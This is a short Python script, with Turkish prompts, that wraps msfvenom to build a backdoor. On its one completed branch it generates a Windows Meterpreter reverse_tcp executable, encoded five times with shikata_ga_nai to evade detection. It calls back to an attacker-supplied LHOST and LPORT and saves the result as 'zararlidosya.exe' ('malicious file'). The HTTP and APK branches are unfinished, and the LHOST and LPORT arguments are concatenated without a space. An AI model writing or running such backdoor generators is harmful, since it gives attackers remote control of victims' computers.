import os
import ipaddress

os.system("figlet msfvenom moduluna hosgeldiniz")




print("""

1)Exe
2)Apk

""")

uzantisecim=int(input("Backdor formatini secin: "))

if uzantisecim==1:
	uzanti=str("-f exe")
	os.system("clear")
	print("""
	
1)tcp
2)http
	
	""")
	baglan=int(input("Baglanma secenegini secin: "))
	if baglan==1:
		baglansecenek=str("-p windows/meterpreter/reverse_tcp")
		os.system("clear")
		# Kullanıcıdan IP adresini alın
		ip_adresi = input("Lütfen bir IP adresi girin: ")
		formatli_ip = "LHOST=" + ip_adresi
		print("Formatlanmış IP adresi: ", formatli_ip)
		#Kullanıcıdan port alın
		port_adresi=input("lütfen port giriniz: ")
		formatli_port = "LPORT=" + port_adresi
		print("Formatlanmış port adresi: ", formatli_port)
		os.system("msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -a x86 --platform windows "+formatli_ip+formatli_port+" -f exe > zararlidosya.exe")
		
	elif baglan==2:
		baglansecenek=str("-p windows/meterpreter/reverse_http")
elif uzantisecim==2:
	uzanti=str("-f apk")
else:
	uzanti=str("-f exe")
	print("varsayilan==exe")


